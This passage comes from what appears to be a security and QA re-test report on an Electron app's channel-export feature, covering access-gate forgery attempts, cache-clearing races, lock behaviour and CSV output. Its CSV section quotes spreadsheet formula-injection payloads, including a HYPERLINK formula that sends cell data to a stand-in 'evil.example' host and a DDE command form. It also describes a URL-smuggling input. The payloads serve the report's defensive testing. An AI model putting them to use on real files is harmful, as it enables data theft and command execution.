  export   : 200 {"jobId":"B-poisoned","cancelled":true,
                  "channel":{…,"exported":0}, dir:"/tmp/ytchan-f69LsX", files:[…5 header-only CSVs]}
  control, a fresh jobId: 200 {"cancelled":false, …}
  ```
  `getOrCreateChannelJob` on the progress path is unchanged, so the POST inherits
  `cancelled: true`. Slice 4's downgrade to minor still holds — `startExport` mints
  a fresh id per run, so it poisons one id only, and the card shows `0 videos`.
- **Proof**: `out/t11-owner-hash.json` (`B`) · **File**: `server/channelRoutes.ts`

### E2-11  E-9 still reproduces: the progress endpoint invents a job for any id and reports a fresh "listing" after the job is collected
- **Severity**: minor · **Status**: confirmed
- ```
  progress, immediately after a finished run : 200 text/event-stream  data: {"phase":"done","current":10,"total":10}
  the same url 7 s later (cleanupTimer fired): 200  data: {"phase":"listing","current":0,"total":0}
  an id that never existed                   : 200  data: {"phase":"listing","current":0,"total":0}
  ```
  A client that reconnects late is told the run has just started. Each such
  request still inserts a `ChannelJob` with no cleanup timer. The gate now wraps
  this route, so only an owner machine can grow the map.
- **Proof**: `out/t5-owner-hash.json` (`phase3`) · **File**: `server/channelRoutes.ts`

### E2-12  E-10 still reproduces: resume works and says nothing
- **Severity**: minor · **Status**: confirmed
- After `SIGKILL` at video 4 of 10, the rerun resumed correctly — server log
  `[server] channel export resuming with 3 video(s) already collected`, final
  10 videos / 10 comments / 20 transcript lines, **0 duplicate rows**, nothing
  stranded in the data folder. 17 UI samples at 120 ms taken across the whole
  rerun: `sawResumeNotice: false`, the first sampled phase is already
  "Comments and transcripts, video 4 of 10". Neither the result card nor
  `summary.csv` records that 3 of the 10 came from the earlier attempt, and
  `exported_at` is the rerun's time.
- **Proof**: `out/t7-owner-hash.json` (`resume`), `out/t7-owner-hash-resume/01-02-resume-done.png`
- **File**: `server/channelRoutes.ts`, `src/components/ChannelExportPanel.tsx`

### E2-13  E-13 still reproduces: a malformed channel URL is rewritten rather than refused
- **Severity**: minor · **Status**: confirmed
- ```
  url with an embedded newline + second URL : 200, channel.url "https://www.youtube.com/@stubhttps:"
  url of 10,005 characters                  : 200, 9,980 a's passed to yt-dlp as argv
  control, a watch URL                      : 400 "That doesn't look like a channel link…"
  control, a non-YouTube URL                : 400 "URL must be a YouTube link"
  ```
  `channelBaseUrl` keeps only the first path segment, so the second URL is
  absorbed into the handle and `summary.csv` records a channel nobody asked for.
- **Proof**: `out/t11-owner-hash.json` (`C`) · **File**: `server/channelRoutes.ts`,
  `src/lib/channel.ts`

### E2-14  E-12 still reproduces in its message half; its privacy half is fixed
- **Severity**: minor · **Status**: confirmed
- Stub failing with
  `ERROR: [youtube:tab] @gone: YouTube said: This channel does not exist. Loading cookies from /home/sam/.config/clipper/yt-cookies.txt`:
  ```
  API  : 500 {"error":"ERROR: [youtube:tab] @gone: … /home/sam/.config/clipper/yt-cookies.txt\nexitCode=1"}
  panel: "ERROR: [youtube:tab] @gone: YouTube said: This channel does not exist.
          Loading cookies from <cookies file>
          exitCode=1"
  url still in the box: "https://www.youtube.com/@gone"   Export button back: true
  ```
  **T10 item 8 holds**: the absolute cookie path is redacted to `<cookies file>`
  on screen (it is still raw in the API body, which no UI shows). What has not
  changed is that the useful sentence is still wrapped in an extractor name and a
  process exit code, with no next step.
- **Proof**: `out/t11-owner-hash.json` (`D`), `out/t11-owner-hash/01-01-yt-dlp-failure.png`
- **File**: `server/channelRoutes.ts` (`fullErrMessage` into the 500 body),
  `src/hooks/useChannelExport.ts`

### E2-15  E-14 still reproduces: temp output folders nobody collects
- **Severity**: minor · **Status**: confirmed
- A `deliver:"path"` run whose caller never calls `export:save` leaves its whole
  CSV output folder behind: 10 `/tmp/ytchan-*` folders, 41,134 bytes, after the
  direct API runs in `t11`. Through the UI `exportSave.cjs` removes them.
  The transcript scratch dir (`fs.mkdtempSync(… "ytchan-")` in `fetchTranscript`)
  is still unprotected too — a `Clear unfinished` landing on it makes that one
  video's captions silently empty and the video is recorded as "no captions".
  That half is **likely**, not confirmed: I did not win the race.
- **Proof**: `out/t11-owner-hash.json` (`E`) · **File**: `server/channelRoutes.ts`
  (`fetchTranscript`, `buildResponse`)

---

## Attacked and found holding

Recorded so a later fix does not disturb them.

**The gate, server side.** On `owner-other` (feature compiled in, this machine not
on the list) and on `public`, all three routes answer **404** with
`text/html; charset=utf-8` and a 155–166 byte Express body — the same status, type
and body shape as `POST /api/channel/does-not-exist` and
`GET /api/channel/nope` measured in the same run. No `401`, no `403`, no
`forbidden`/`unauthorized`/`owner`/`denied` anywhere in any body, no stack trace,
no absolute path. `GET /api/cache/usage` answers 200 on the same instance, so the
404s are real absences and not a dead server. Unchanged after every attack below,
and unchanged after a reload.

**Forging the gate.** 14 key names written into **both** `localStorage` and the
main-process settings store — `clipper.owner`, `clipper.ownerMachine`,
`clipper.channelData`, `clipper.isOwner`, `clipper.ownerAccess`, `clipper.screen`,
`owner`, `ownerAccess`, `isOwner`, `CHANNEL_DATA`, `__CHANNEL_DATA__`,
`VITE_ENABLE_CHANNEL_DATA`, `VITE_OWNER_MACHINES`, `clipper.VITE_OWNER_MACHINES`
— all persisted to `settings.json` (`settings:set` returned `{ok:true}`), and after
a reload: `navHasChannelLink: false`, no panel, no "Channel data" in the body text,
routes still 404 (`out/t2-owner-other/02-02-after-forged-keys.png`,
`out/t2-public/02-02-after-forged-keys.png`). There is no persisted owner key to
forge.

**The bridge.** `window.electronAPI.isOwnerMachine = async () => true` reports as
assigned (`contextBridge` hands over a frozen clone — `Object.isFrozen: true`) but
the real function still answers `false`, and the override does not survive a
reload. Run 1's result, reproduced.

**The owner build.** `owner-hash` and `owner-star` both complete an export end to
end in the packaged shape: entry present, panel opens, Export enabled,
`Export saved — 10 videos · 20 comments · 20 transcript lines`, five CSVs moved
into the campaign's data folder, `summary.csv` honest (`out/t1-owner-hash/02-02-panel-open.png`,
`03-03-run1-done.png`, `out/t1-owner-star/03-03-run1-done.png`). The gate answered from the
value `scripts/build-server.cjs` baked in: `electron/main.cjs:197` sets
`process.env.ELECTRON_RESOURCES` before the server is required, so
`ownerSetting`'s `.env` fallback is never taken, and there is no `.env` in the repo
or in the run's working directory. The route layer discriminates on the machine,
not merely on "the list is non-empty" — `owner-other` has a non-empty list and
gets 404.

**T10's added startup check costs nothing measurable.** Time from the header
rendering to `#ui-channel-link` existing: `owner-star` 198 ms, `owner-hash` 294 ms
(header ready at 155 ms / 234 ms). Header height 48 px before and after in all four
shapes — no layout shift, no flash of a moved nav
(`out/t14-owner-star/01-01-owner-star-header.png`,
`out/t14-owner-other/01-01-owner-other-header.png`). `*` is honoured in the main
process exactly as the renderer honoured it, including `" * "` with padding and an
empty salt.

**E-2's two mechanisms, each with the other defeated** (`t4-e2-mechanisms.ts`,
real `clearCache`/`cacheUsage`/`markInUse`/`isProtected`, with `os.tmpdir()`
pointed at a scratch dir so the global sweep cannot touch other areas' work):

```
control  ytchan-abandoned, no hold      -> removed                      (the probe discriminates)
prefix DEFEATED, markInUse alone:
         ytchan-live-held + markInUse   -> SURVIVES, usage says protectedFolders:1,
                                           clear reports skipped:1, and it is
                                           removed once released
markInUse DEFEATED, prefix alone:
         ytchanwip-live-unheld          -> SURVIVES, isProtected:false, and it is
                                           not counted as reclaimable at all
both defeated:
         ytchan-live-naked              -> destroyed  (which is what the strict
                                           appendCheckpoint then has to catch)
```

**E-2 in the running app.** Mid-export (`Comments and transcripts, video 3 of 10`),
`POST /api/cache/clear` removed 85 folders and `skipped: 0` — and the live
checkpoint `/tmp/ytchanwip-7ad01575a4e6da64` was untouched, file for file and byte
for byte. The run finished `Export saved — 10 videos · 30 comments · 20 transcript
lines`, `comments.csv` 30 rows, `transcripts.csv` 20 rows, `summary.csv`
`exported=10, cancelled=false, included="video details; comments; transcripts"`.
No error banner, and nothing to need one. Screenshots:
`out/t5-owner-hash/01-01-mid-export.png`, `02-02-after-cache-clear.png`,
`03-03-phase1-done.png`.

**Both mechanisms defeated at once** (the folder `rm -rf`d from outside the
process): the run stopped and said so — `role="alert"`: *"The export's working
folder disappeared mid-run (comments.jsonl), so the result would be incomplete.
Nothing was saved. Run it again."* — no result card, **no partial CSVs stranded in
the data folder**, and the previous run's folder left intact
(`out/t5-owner-hash/04-04-checkpoint-deleted.png`, `05-05-phase2-done.png`). This is exactly the
behaviour T7 claimed and it is the single biggest improvement in the area.

**E-3 through the real UI, two workspace tabs, no devtools.** Tab A exporting
(`Comments and transcripts, video 6 of 10`), tab B started with the identical
request: tab B's panel shows *"This export is already running. Wait for it to
finish, or cancel it, before starting it again."* and never starts. Tab A finished
with `comments.csv` 20 rows / `transcripts.csv` 20 rows / `videos.csv` 10 rows,
**0 duplicate rows**, one folder on disk, and the checkpoint cleared afterwards
(`out/t6-owner-hash/01-01-tabA-running.png`, `02-02-both-tabs-same-request.png`,
`03-03-both-tabs-finished.png`).

**Two *different* exports still run side by side.** Limits 11 and 12 in two tabs:
both panels exporting at once, two folders, `11 videos / 22 comments / 22
transcripts` and `12 / 24 / 24`, 0 duplicate rows in either
(`out/t6-owner-hash/04-04-two-different-exports.png`, `05-05-two-different-finished.png`).

**The lock's key and its release.** A duplicate is refused when it differs only in
`fresh: true`, only in `deliver: "rows"`, or only in `cookiesFromBrowser`; a
different `limit` runs concurrently; and an identical request is accepted again as
soon as the first finishes. **Cancel racing the 409**: duplicate → 409, cancel →
200, the cancelled run returned its partial 200, and a third identical request was
then accepted — the slot is freed, with no orphaned lock. A client that
**abandons** the request without cancelling frees the lock within one 400 ms poll
(one 409, then free); a proper cancel frees it before the next request lands.

**E-5.** Two runs of the same channel on the same day, the second with Video
details and Comments unticked:
`Stub Channel-export-2026-11-21-210047-lzys` and
`…-210048-vap7` — two folders one second apart, each holding only its own run's
files, each `summary.csv` describing its own run
(`included="video details; comments; transcripts"` vs `included="transcripts"`).

**E-7.** Both writers neutralise a leading `=` `+` `-` `@` `\t` `\r` `\n` with a
single quote and leave real numbers and plain decimal strings alone, and they are
**byte-identical**: 19 payloads (including `=cmd reply`,
`=HYPERLINK("http://evil.example/?x="&A1,"click")`, `=WEBSERVICE(…)`, `+1+1`,
`-2-2`, `@SUM(1:1)`, the DDE form `=cmd|' /C calc'!A1`, a leading tab/CR/LF, and
`=1+1, "quoted" caption 🎬 עברית`) × both writers → identical cells; 5 typed-value
rows → identical; all 5 column lists and their headers → identical; the whole
20-row `comments.csv` → identical, with no first difference. `writeCsv` and
`writeCsvFromJsonl` produce the same bytes as each other and as the client.
Round-tripped through an RFC 4180 parser written in the script from the spec:
**0 failures** for either writer, BOM present, CRLF, no ragged rows, and
**0 cells that still begin with a formula character after parsing**.

Driven for real as well: a 5-video export whose comments and captions are the
payloads above → `comments.csv` 80 rows, 60 neutralised cells, **0 formula cells**;
`transcripts.csv` 20 rows, 20 neutralised, 0 formula cells; emoji, RTL text, an
embedded comma and a doubled quote all round-trip exactly. Bytes kept in
`out/csv-evidence/` and `out/csv-evidence-app/`.

---

## Not provable here

- **A real channel.** Every listing, metadata, comment and caption row came from
  my stub; the network policy refuses `youtube.com`. Real `--flat-playlist` shape,
  the Videos-vs-Shorts ranking asymmetry, `max_comments=50,50,0,0`, real VTT
  quirks and real `channel_follower_count` are **not provable here**.
- **Scale.** Validated at 10–16 videos. Whether the 7-day orphaned checkpoint of
  E2-3 is megabytes or gigabytes, and whether a 10,000-video run stays inside
  memory, needs a real channel and hours.
- **The packaged artefact.** E2-7's `electron/*.cjs` leak is argued from
  `package.json`'s `build.files` plus the files as built into the mirror; no
  `.dmg`/`.exe`/`.AppImage` was produced.
- **The real owner's machine list**, and `readMachineId` on macOS/Windows (the
  `ioreg` and `reg query` branches, including their 5 s `execFile` timeout, which
  is what the first request to a gated route would wait on there). Only the Linux
  branch ran.
- **A spreadsheet actually evaluating the E-7 payloads.** The bytes are proven and
  nothing survives as a formula; Excel/Sheets/LibreOffice are not installed here.
- **Run 1's E-11 (accessibility) and E-15 (form polish)** were not on the fix list
  and were **not re-run** in this pass; nothing here contradicts them.

## One note on collateral

`POST /api/cache/clear` is global over the OS temp dir by design, so the E-2
reproduction removed abandoned `ytclip-`/`ytchan-` folders belonging to other
areas' earlier runs (85 in one call). Folders a job was writing to were skipped by
the product's own `isProtected` rule, so nothing in flight was touched. The
module-level mechanism test (`t4-e2-mechanisms.ts`) is scoped to a scratch
directory for exactly this reason.
